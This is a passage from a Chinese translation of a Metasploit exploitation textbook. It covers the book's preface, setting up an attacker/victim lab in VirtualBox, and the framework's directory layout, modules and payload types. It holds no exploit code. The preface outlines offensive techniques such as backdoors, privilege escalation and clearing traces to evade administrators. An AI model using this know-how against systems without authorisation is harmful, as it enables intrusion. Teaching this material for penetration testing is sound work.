# Metasploit 利用和开发学习手册（一）

> 原文：[`annas-archive.org/md5/06935739EF69DCE5B12AC6163AC47910`](https://annas-archive.org/md5/06935739EF69DCE5B12AC6163AC47910)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 前言

《学习 Metasploit 利用和开发》是一本指导如何利用最佳技巧掌握利用艺术的实际网络黑客攻击指南。

这本书经过精心设计，分阶段进行，以促进有效学习。从实际设置到漏洞评估，最终到利用，本书深入探讨了渗透测试的知识。本书涉及使用一些工业常用工具进行漏洞评估练习和报告制作技巧。它涵盖了客户端利用、后门、利用后期，以及与 Metasploit 一起进行利用开发的主题。

本书的开发考虑到了实际的动手操作，以便读者可以有效地尝试和测试他们所读到的内容。我们相信这本书将有效地帮助您发展成为一名攻击型渗透测试人员的技能。

# 本书涵盖的内容

第一章，“实验室设置”，介绍了书中所需的完整实验室设置。

第二章，“Metasploit 框架组织”，介绍了 Metasploit 框架的组织结构，包括各种接口和 Metasploit 框架的架构。

第三章，“利用基础”，介绍了漏洞、有效载荷和利用的基本概念。我们还将学习如何使用 Metasploit 通过各种利用技术来妥协易受攻击的系统。

第四章，“Meterpreter 基础”，介绍了用户如何通过 Meterpreter 侵入系统，以及在利用后可能使用 Meterpreter 功能提取的各种信息类型。

第五章，“漏洞扫描和信息收集”，介绍了使用 Metasploit 模块收集有关受害者的各种信息的技术。

第六章，“客户端利用”，介绍了通过 Metasploit 进行客户端利用的各种技术。

第七章，“利用后期”，介绍了利用后期的第一阶段，并讨论了通过 Meterpreter 获取受损系统各种信息的技术。

第八章，“利用后期-权限提升”，介绍了在妥协系统后提升权限的各种技术。我们将使用各种脚本和利用后期模块来完成这项任务。

第九章，“利用后期-清除痕迹”，介绍了在妥协系统后清除痕迹的各种技术，以避免被系统管理员发现。

第十章，“利用后期-后门”，介绍了如何在受损系统上部署后门可执行文件以建立持久连接。

第十一章，“利用后期-枢纽和网络嗅探”，介绍了通过各种技术利用我们在外部网络上的接触点服务器/系统，并利用它来利用不同网络上的其他系统的方法。

第十二章，“使用 Metasploit 进行利用研究”，涵盖了使用 Metasploit 进行利用开发的基础知识，使用 Metasploit 制作利用和利用各种有效载荷的内容。

第十三章 *使用社会工程工具包和 Armitage*，介绍了如何使用 Metasploit Framework 的附加工具，并进一步增强我们的利用技能。

# 本书所需内容

本书的实践所需软件包括 BackTrack R2/R3、Windows XP SP2 和 Virtual Box。

# 本书适合对象

本书适用于对网络利用和黑客技术感兴趣的安全专业人士。本指南包含了一些章节，旨在培养工业渗透测试人员测试工业网络的技能。

# 约定

在本书中，您将找到许多不同类型信息的文本样式。以下是一些示例以及它们的含义解释。

文本中的代码词如下所示：“列出重要的目录，包括`data`、`external`、`tools`、`plugins`和`scripts`。”

**新术语**和**重要词汇**以粗体显示。例如，屏幕上看到的词语，如菜单或对话框中的词语，会以这样的方式出现在文本中：“如果我们想手动配置网络设置，可以选择**自定义设置**，然后点击**下一步>**”。

### 注意

警告或重要提示会以这样的方式出现在方框中。

### 提示

提示和技巧会出现在这样的样式中。


# 第一章：实验室设置

在本章中，我们将演示为了实际的实验和实践工作经验而需要的完整实验室设置。为了设置实验室，我们需要三样东西：Oracle VM VirtualBox，Microsoft Windows XP SP2 和 BackTrack 5 R2。

Oracle VM VirtualBox 是 Sun Microsystems 的产品。它是一个软件虚拟化应用程序，用于在单台计算机上运行多个操作系统。它支持许多操作系统，包括 Linux，Macintosh，Sun Solaris，BSD 和 OS/2。每个虚拟机可以与主机操作系统并行执行自己的操作系统。它还支持虚拟机内的网络适配器、USB 设备和物理磁盘驱动器。

Microsoft Windows XP 是由微软公司生产的操作系统。它主要用于个人计算机和笔记本电脑。

BackTrack 是一个基于 Linux 的免费操作系统。它被安全专业人员和渗透测试人员广泛使用。它包含许多用于渗透测试和数字取证的开源工具。

现在我们将在 Oracle VM VirtualBox 中安装两个操作系统，并将 BackTrack 用作攻击者机器，Windows XP 用作受害者机器。

# 安装 Oracle VM VirtualBox

安装 Oracle VM VirtualBox 的步骤是：

1.  首先，运行安装文件开始安装过程，然后单击**下一步>**。![安装 Oracle VM VirtualBox](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_01.jpg)

1.  现在选择要安装的安装目录，然后单击**下一步>**。![安装 Oracle VM VirtualBox](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_02.jpg)

1.  如果要在桌面或启动栏中创建快捷方式图标，请选择快捷方式选项，然后单击**下一步>**。

1.  然后它将重置网络连接并显示警告标志；单击**是**并继续向导的安装。![安装 Oracle VM VirtualBox](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_04.jpg)

1.  安装向导已准备好进行安装，请单击**安装**继续。![安装 Oracle VM VirtualBox](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_05.jpg)

1.  安装已经开始，并且需要几分钟时间来完成。

1.  现在它将要求安装 USB 设备驱动程序，单击**安装**安装驱动程序软件。![安装 Oracle VM VirtualBox](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_07.jpg)

1.  几分钟后，安装向导完成，Oracle VM VirtualBox 已准备就绪。单击**完成**。![安装 Oracle VM VirtualBox](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_08.jpg)

# 在 Oracle VM VirtualBox 上安装 WindowsXP

现在我们将在 VirtualBox 中安装 Windows XP SP2。只需按照以下步骤进行成功安装：

1.  首先，启动您的 VirtualBox，然后单击**新建**。![在 Oracle VM VirtualBox 上安装 WindowsXP](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_09.jpg)

1.  您将获得一个新窗口，其中显示**欢迎使用新虚拟机向导**的消息；单击**下一步**。

1.  您将获得一个新窗口显示内存选项，在这里我们需要指定虚拟机的基本内存（RAM）的数量。选择内存量，然后单击**下一步**。![在 Oracle VM VirtualBox 上安装 WindowsXP](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_11.jpg)

1.  之后，我们将获得一个新窗口，其中有创建虚拟硬盘的选项。在这里，我们将选择**创建新的硬盘**，然后单击**下一步**。![在 Oracle VM VirtualBox 上安装 WindowsXP](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_12.jpg)

1.  然后我们将获得一个新窗口，其中显示**欢迎使用虚拟磁盘创建向导**的消息。在这里，我们有一些硬盘文件类型的选项；我们选择**VDI（VirtualBox 磁盘映像）**。您可以选择其他类型的文件，但建议选择 VDI 以获得最佳性能。选择文件类型后，单击**下一步**。![在 Oracle VM VirtualBox 上安装 WindowsXP](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_13.jpg)

1.  然后我们看到一个名为**Virtual disk storage details**的新窗口。在此窗口中，我们可以看到两种存储类型的详细信息：**动态分配**和**固定大小**。这两种存储类型的详细信息在此窗口中提到。因此，这取决于用户可能更喜欢哪种存储。在这种情况下，我们将选择**动态分配**；单击**Next**继续。![在 Oracle VM VirtualBox 上安装 WindowsXP](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_14.jpg)

1.  现在我们将得到一个新窗口，其中包含虚拟磁盘文件的**位置**和**大小**选项。我们选择要创建虚拟磁盘文件的位置。之后，选择虚拟磁盘的大小。在这种情况下，我们为虚拟磁盘指定了 10GB 的空间。然后单击**Next**继续。![在 Oracle VM VirtualBox 上安装 WindowsXP](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_15.jpg)

1.  然后我们得到一个新窗口，其中显示了虚拟机设置的摘要。在此窗口中，我们可以检查先前为虚拟机提供的设置，例如硬盘文件类型，存储详细信息，位置详细信息和硬盘大小。检查设置后，我们然后单击**Create**。![在 Oracle VM VirtualBox 上安装 WindowsXP](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_16.jpg)

1.  我们得到**Summary**窗口，它将显示将使用以下参数创建虚拟机：虚拟机名称，操作系统类型，基本内存（RAM）和硬盘大小。验证所有设置后，单击**Create**以创建虚拟机。

1.  现在**Oracle VM VirtualBox Manager**将打开，并在右窗格中显示虚拟机。 选择该虚拟机，然后单击**Start**以开始 Windows XP 的安装过程。![在 Oracle VM VirtualBox 上安装 WindowsXP](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_18.jpg)

1.  将出现一个带有消息**Welcome to the First Run Wizard!**的新窗口。单击**Next**开始。![在 Oracle VM VirtualBox 上安装 WindowsXP](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_19.jpg)

1.  现在将出现一个新窗口，其中包含选择安装媒体源的选项。此选项允许我们选择 Windows XP 的 ISO 映像或 DVD-ROM 驱动器以从 CD / DVD 安装。选择适当的选项，然后单击**Next**。![在 Oracle VM VirtualBox 上安装 WindowsXP](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_20.jpg)

1.  将打开一个新的**Summary**窗口，它将显示所选安装的媒体类型，媒体源和设备类型。单击**Start**。![在 Oracle VM VirtualBox 上安装 WindowsXP](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_21.jpg)

1.  Windows XP 安装将开始，屏幕上方将出现带有消息**Windows Setup**的蓝屏。![在 Oracle VM VirtualBox 上安装 WindowsXP](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_22.jpg)

1.  现在我们将得到一个带有消息**Welcome to setup**的新窗口。在这里，我们可以看到三个选项，第一个选项是**现在设置 Windows XP，请按 ENTER**。![在 Oracle VM VirtualBox 上安装 WindowsXP](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_23.jpg)

1.  然后我们将被提示同意 Windows XP 许可证；按*F8*接受。

1.  接受协议后，我们将看到未分区空间对话框。我们需要从这个未分区空间创建分区。选择第二个选项**在未分区空间中创建分区，请按 C**。![在 Oracle VM VirtualBox 上安装 WindowsXP](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_25.jpg)

1.  按下*C*后，下一步是设置新分区的大小，然后按**Enter**。![在 Oracle VM VirtualBox 上安装 WindowsXP](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_26.jpg)

1.  创建新分区后，我们现在可以在这里看到三个选项；选择第一个选项**在所选项目上设置 Windows XP，请按 ENTER**继续。![在 Oracle VM VirtualBox 上安装 WindowsXP](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_27.jpg)

1.  现在我们必须在继续安装过程之前格式化所选的分区。这里有四个格式化选项，选择第一个选项“使用 NTFS 文件系统（快速）格式化分区”，然后按 Enter。![在 Oracle VM VirtualBox 上安装 WindowsXP](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_28.jpg)

1.  现在设置将格式化分区。![在 Oracle VM VirtualBox 上安装 WindowsXP](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_29.jpg)

1.  在格式化分区后，设置将复制 Windows 文件。![在 Oracle VM VirtualBox 上安装 WindowsXP](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_30.jpg)

1.  在复制 Windows 文件后，虚拟机将在 10 秒后重新启动，或者按“回车”立即重新启动。![在 Oracle VM VirtualBox 上安装 WindowsXP](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_31.jpg)

1.  重新启动虚拟机后，您将看到 Windows XP 启动画面。

1.  Windows 安装过程将开始，并需要大约 40 分钟才能完成。

1.  现在会出现一个新窗口，用于“区域和语言选项”，只需单击“下一步>”。![在 Oracle VM VirtualBox 上安装 WindowsXP](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_34.jpg)

1.  之后会出现一个新窗口，要求输入“姓名”和“组织”名称；输入这些详细信息，然后单击“下一步>”。![在 Oracle VM VirtualBox 上安装 WindowsXP](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_35.jpg)

1.  会出现一个新窗口，要求输入“产品密钥”；输入密钥，然后单击“下一步>”。![在 Oracle VM VirtualBox 上安装 WindowsXP](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_36.jpg)

1.  下一个向导将要求输入“计算机名称”和“管理员密码”，输入这些详细信息，然后单击“下一步>”。![在 Oracle VM VirtualBox 上安装 WindowsXP](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_37.jpg)

1.  接下来会出现一个屏幕，要求输入日期、时间和时区设置。根据您的国家/地区选择时区，输入日期和时间，然后单击“下一步>”。![在 Oracle VM VirtualBox 上安装 WindowsXP](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_38.jpg)

1.  我们将再次看到安装屏幕，显示“正在安装网络”设置。![在 Oracle VM VirtualBox 上安装 WindowsXP](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_39.jpg)

1.  一个新窗口将提示我们选择网络设置。选择“典型设置”。如果我们想手动配置网络设置，可以选择“自定义设置”，然后单击“下一步>”。![在 Oracle VM VirtualBox 上安装 WindowsXP](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_40.jpg)

1.  向导将询问我们是否要将计算机加入工作组或域。对于我们的实验室，我们选择“工作组”，然后单击“下一步>”。![在 Oracle VM VirtualBox 上安装 WindowsXP](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_41.jpg)

1.  然后我们将看到 Windows XP 启动画面。

1.  Windows XP 启动后，我们将看到一条“欢迎使用 Microsoft Windows”的消息。要继续，请单击“下一步”。![在 Oracle VM VirtualBox 上安装 WindowsXP](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_43.jpg)

1.  向导将询问我们是否要打开自动更新。根据您的偏好进行选择，然后单击“下一步”。

1.  下一个向导将询问有关互联网连接；我们建议您单击“跳过”以跳过。![在 Oracle VM VirtualBox 上安装 WindowsXP](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_45.jpg)

1.  现在向导将询问在线注册的事项；我们不想注册，因此选择第二个选项，然后单击“下一步”。![在 Oracle VM VirtualBox 上安装 WindowsXP](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_46.jpg)

1.  接下来，向导将要求输入将使用此计算机的人的用户名。输入这些名称，然后单击“下一步”。![在 Oracle VM VirtualBox 上安装 WindowsXP](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_47.jpg)

1.  您将看到一条“感谢您”的消息；单击“完成”。

1.  现在您的 Windows XP 安装已准备就绪。![在 Oracle VM VirtualBox 上安装 WindowsXP](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_49.jpg)

# 在 Oracle VM Virtual Box 上安装 BackTrack5 R2

现在我们将在 Virtual Box 上安装 BackTrack 5 R2。执行以下步骤：

1.  首先，启动您的 Oracle VM Virtual Box。![在 Oracle VM VirtualBox 上安装 BackTrack5 R2](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_50.jpg)

1.  将出现一个新窗口，其中包含消息**Welcome to the New Virtual Machine Wizard**；单击**Next**。

1.  我们遵循了在创建 Windows XP 虚拟机时遵循的相同过程，用于 BackTrack 虚拟机设置。 我们的 BackTrack 机器将被设置，并且摘要将显示如下屏幕截图所示。 单击**Create**：![在 Oracle VM Virtual Box 上安装 BackTrack5 R2](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_52.jpg)

1.  现在**Oracle VM VirtualBox Manager**将打开，并在右窗格中显示新的虚拟机。 选择该虚拟机，然后单击**Start**以开始安装 BackTrack 5 的过程。![在 Oracle VM Virtual Box 上安装 BackTrack5 R2](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_53.jpg)

1.  将出现一个新窗口，其中包含消息**Welcome to the First Run Wizard!**；单击**Next**开始。![在 Oracle VM Virtual Box 上安装 BackTrack5 R2](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_54.jpg)

1.  将出现一个新窗口，其中包含选择安装媒体源的选项。 选择 BackTrack 5 的 ISO 镜像或 DVD 光驱以从 CD / DVD 安装，然后单击**Next**。![在 Oracle VM Virtual Box 上安装 BackTrack5 R2](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_55.jpg)

1.  将打开一个新的**Summary**窗口，并显示所选安装媒体的类型，媒体源和设备类型；现在单击**Start**。![在 Oracle VM Virtual Box 上安装 BackTrack5 R2](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_56.jpg)

1.  我们将看到一个黑色的启动屏幕；只需按*Enter*。![在 Oracle VM Virtual Box 上安装 BackTrack5 R2](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_57.jpg)

1.  将出现 BackTrack 引导屏幕，显示命令行界面，显示提示：**root@bt:~#**；将`startx`作为此命令的值输入并按*Enter*。

1.  现在 BackTrack GUI 界面将启动，我们将看到一个名为**Install BackTrack**的图标。 我们必须单击该图标以继续安装过程。![在 Oracle VM Virtual Box 上安装 BackTrack5 R2](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_59.jpg)

1.  之后，安装向导将启动。 选择语言，然后单击**Forward**。![在 Oracle VM Virtual Box 上安装 BackTrack5 R2](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_60.jpg)

1.  安装向导将自动从网络时间服务器设置时间。

1.  选择**时区**和**地区**，然后单击**Forward**。![在 Oracle VM Virtual Box 上安装 BackTrack5 R2](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_62.jpg)

1.  下一个向导将要求选择**键盘布局**。 根据您的语言选择适当的布局，然后单击**Forward**。![在 Oracle VM Virtual Box 上安装 BackTrack5 R2](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_63.jpg)

1.  磁盘分区向导将出现。 只需使用默认设置，然后单击**Forward**。![在 Oracle VM Virtual Box 上安装 BackTrack5 R2](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_64.jpg)

1.  现在单击**Install**。![在 Oracle VM Virtual Box 上安装 BackTrack5 R2](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_65.jpg)

1.  设置将开始复制文件。 完成安装大约需要 40 分钟。

1.  安装完成后，只需单击**Restart**，现在 BackTrack 安装已准备就绪。![在 Oracle VM Virtual Box 上安装 BackTrack5 R2](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_01_67.jpg)

# 摘要

在这个实验室设置中，我们已经设置了受害者和攻击者机器，我们将在实际会话中使用它们。 下一章将介绍 Metasploit 框架的组织，基础知识，架构以及简要介绍。


# 第二章：Metasploit 框架组织

在本章中，我们将调查 Metasploit 框架的组织结构。Metasploit 框架是由*HD Moore*于 2003 年创建的开源项目，后来于 2009 年 10 月 21 日被 Rapid7 LLC 收购。Metasploit 2.0 于 2004 年 4 月发布，这个版本包括 19 个漏洞利用和 27 个有效载荷。从那时起一直在不断开发，现在我们有 Metasploit 4.5.2，其中包括数百个漏洞利用和有效载荷。Moore 创建了这个框架用于开发利用代码和攻击易受攻击的远程系统。它被认为是支持使用 Nessus 和其他著名工具进行漏洞评估的最佳渗透测试工具之一。这个项目最初是用 Perl 开发的，后来用 Ruby 重写。自收购以来，Rapid7 还添加了两个专有版本，称为 Metasploit Express 和 Metasploit Pro。Metasploit 支持包括 Windows、Linux 和 Mac OS 在内的所有平台。

# Metasploit 接口和基础知识

首先我们将看看如何从终端和其他方式访问 Metasploit 框架。打开你的终端，输入`msfconsole`。在终端中会显示为`root@bt:~# msfconsole`。

![Metasploit 接口和基础知识](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_02_01.jpg)

现在我们已经从终端程序打开了`msfconsole`；然而我们还可以通过其他方式访问 Metasploit 框架，包括 MsfGUI、Msfconsole、Msfcli、Msfweb、Metasploit Pro 和 Armitage。在本书中，我们将大部分时间使用`msfconsole`。

![Metasploit 接口和基础知识](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_02_02.jpg)

那么 Metasploit 的组织结构是怎样的呢？我们可以在这里看到许多接口。随着我们深入挖掘 Metasploit 的各个方面，我们将详细了解架构的细节。现在我们需要理解的重要事情是整体架构。这个架构是开源的，这允许你在 Metasploit 中创建自己的模块、脚本和许多其他有趣的东西。

Metasploit 的库架构如下：

+   **Rex**：这是 Metasploit 中用于各种协议、转换和套接字处理的基本库。它支持 SSL、SMB、HTTP、XOR、Base64 和随机文本。

+   **Msf::Core**：这个库定义了框架并为 Metasploit 提供了基本的应用程序接口。

+   **Msf::Base**：这个库为 Metasploit 框架提供了一个简化和友好的应用程序接口。

现在我们将更详细地探索 Metasploit 目录。只需按照以下步骤探索目录：

1.  打开你的 BackTrack5 R2 虚拟机和你的终端。输入`cd /opt/metasploit/msf3`，然后按*Enter*。现在我们已经进入了 Metasploit Framework 目录。要查看 Metasploit 目录中的文件和目录列表，输入`ls`。![Metasploit 接口和基础知识](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_02_04.jpg)

1.  输入`ls`命令后，我们可以看到这里有许多目录和脚本。列出的重要目录包括`data`、`external`、`tools`、`plugins`和`scripts`。

我们将逐个探索所有这些重要的目录：

+   我们通过输入命令`cd data/`进入`data`目录。这个目录包含许多辅助模块，如`meterpreter`、`exploits`、`wordlists`、`templates`等。![Metasploit 接口和基础知识](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_02_05.jpg)

+   接下来我们将探索`meterpreter`目录。输入`cd meterpreter/`进入目录，我们会看到许多`.dll`文件。实际上，它包含`.dll`文件以及其他有趣的东西，通常需要启用 Meterpreter 功能的**后期利用**。例如，我们可以在这里看到不同类型的 DLL 文件，如 OLE、Java 版本、PHP 版本等。![Metasploit 接口和基础知识](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_02_06.jpg)

+   `data`目录中的另一个目录是`wordlist`目录。该目录包含不同服务的用户名和密码列表，如 HTTP、Oracle、Postgres、VNC、SNMP 等。让我们探索`wordlist`目录，输入`cd ..`并按*Enter*键从`meterpreter`目录返回到`data`目录。之后，输入`cd wordlists`并按*Enter*键。

![Metasploit 接口和基础知识](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_02_07.jpg)

+   另一个有趣的目录是`msf3`中的`external`，其中包含 Metasploit 使用的外部库。让我们通过输入`cd external`来探索`external`目录。![Metasploit 接口和基础知识](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_02_08.jpg)

+   然后看看`scripts`目录，该目录包含在`msf3`目录中。该目录包含许多被 Metasploit 使用的脚本。输入`cd scripts`然后输入`ls`命令来查看文件和文件夹列表。![Metasploit 接口和基础知识](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_02_09.jpg)

+   `msf3`中的另一个重要目录是`tools`目录。该目录包含用于利用的工具。我们将通过输入`cd tools`然后输入`ls`命令来探索`tools`目录，以查看诸如`pattern_create.rb`和`pattern_offset.rb`之类的工具列表，这些工具对于利用研究非常有用。![Metasploit 接口和基础知识](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_02_10.jpg)

+   最后一个有用的目录是`msf3`目录中的`plugins`。`plugins`目录包含用于将第三方工具（如 nessus 插件、nexpose 插件、wmap 插件等）与 Metasploit 集成的插件。让我们通过输入`cd plugins`然后输入`ls`命令来查看插件列表。![Metasploit 接口和基础知识](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_02_11.jpg)

通过前面的解释，我们现在对 Metasploit 的目录结构和功能有了简要的了解。一个重要的事情是更新 Metasploit 以获得最新版本的利用。打开你的终端，输入`msfupdate`。更新最新模块可能需要几个小时。

![Metasploit 接口和基础知识](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_02_12.jpg)

# 利用模块

在转向利用技术之前，首先我们应该了解利用的基本概念。利用是利用特定漏洞的计算机程序。

现在看看`msf3`的模块目录中的利用模块。打开你的终端，输入`cd /opt/metasploit/msf3/modules/exploits`，然后输入`ls`命令来查看利用列表。

![利用模块](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_02_13.jpg)

在这里我们可以看到利用模块的列表。基本上，利用是根据操作系统进行分类的。因此，让我们通过输入`cd windows`来查看利用模块的`windows`目录。

![利用模块](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_02_14.jpg)

在`windows`目录中，我们可以看到许多根据 Windows 服务进行分类的利用模块，如`ftp`、`smb`、`telnet`、`browser`、`email`等。在这里，我们将通过探索一个目录来展示一种类型的服务利用。例如，我们选择`smb`。

![利用模块](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_02_15.jpg)

我们看到了基本上是 Ruby 脚本的`smb`服务利用的列表。因此，要查看任何利用的代码，我们输入`cat <exploitname>`。例如，这里我们选择了`ms08_067_netapi.rb`。所以我们输入`cat ms08_067_netapi.rb`。

![利用模块](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_02_16.jpg)

同样，我们可以根据操作系统和其服务来探索所有类型的利用。

## 辅助模块

辅助模块是没有有效载荷的利用。它们用于各种任务，如端口扫描、指纹识别、服务扫描等。辅助模块有不同类型，如协议扫描器、网络协议模糊器、端口扫描器模块、无线模块、拒绝服务模块、服务器模块、管理访问利用等。

现在让我们探索`msf`目录下的辅助模块目录。输入`cd /opt/metasploit/msf3/modules/auxiliary`，然后使用`ls`命令查看辅助模块列表。

![辅助模块](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_02_17.jpg)

在这里我们可以看到辅助模块的列表，比如`admin`、`client`、`fuzzers`、`scanner`、`vsploit`等。现在我们将作为辅助模块探索 scanner 目录。

![辅助模块](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_02_18.jpg)

在`scanner`目录中，我们将看到根据服务扫描进行分类的模块。我们可以选择任何服务模块进行探索。在这里我们将选择`ftp`作为扫描器模块。

![辅助模块](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_02_19.jpg)

在`ftp`目录中，我们可以看到三个 Ruby 脚本。要查看 exploit Ruby 代码，只需输入`cat <module name>`；例如，在这里我们会输入`cat anonymous.rb`。

![辅助模块](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_02_20.jpg)

# 深入了解 Payloads

Payload 是在系统被入侵后运行的软件。Payload 通常附加到 exploit 并随其一起交付。在 Metasploit 中有三种不同类型的 payload，分别是`singles`、`stagers`和`stages`。Stages payload 的主要作用是它们使用小型 stagers 来适应小的利用空间。在利用过程中，exploit 开发者可以使用的内存非常有限。stagers 使用这个空间，它们的工作是拉取其余的 staged payload。另一方面，singles 是独立的和完全独立的。就像运行一个小的可执行文件一样简单。

让我们看一下以下截图中的`payload` `modules`目录：

